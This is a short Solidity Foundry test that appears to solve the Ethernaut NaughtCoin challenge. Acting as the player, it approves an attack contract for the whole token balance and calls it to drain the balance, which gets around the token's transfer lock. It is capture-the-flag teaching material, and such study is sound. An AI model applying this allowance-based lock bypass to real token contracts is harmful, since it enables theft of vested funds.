// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "./NaughtCoin.sol";
import "./NaughtCoinAttack.sol";

contract NaughtCoinTest is Test {
    NaughtCoin naughtCoin;
    NaughtCoinAttack naughtCoinAttack;
    address player = address(1);

    function setUp() public {
        naughtCoin = new NaughtCoin(player);
        naughtCoinAttack = new NaughtCoinAttack();
    }

    function testNaughtCoin() public {
        uint256 playerBalance = naughtCoin.balanceOf(player);

        vm.prank(player);
        naughtCoin.approve(address(naughtCoinAttack), playerBalance);
        require(
            naughtCoin.allowance(player, address(naughtCoinAttack)) == playerBalance,
            "wrong allowance"
        );
        vm.prank(player);
        naughtCoinAttack.attack(address(naughtCoin), playerBalance);
        // naughtCoin.transferFrom(player, address(2), palyerBalance);

        require(naughtCoin.balanceOf(player) == 0, "wrong player balance");
    }
}
